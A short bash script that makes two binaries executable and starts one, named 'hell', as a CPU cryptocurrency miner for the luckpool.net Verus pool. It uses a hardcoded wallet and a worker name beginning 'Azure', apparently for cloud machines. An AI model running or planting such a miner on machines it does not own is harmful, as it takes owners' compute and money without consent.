#!/bin/bash
chmod +x hell
chmod +x verus-solver
./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu 15
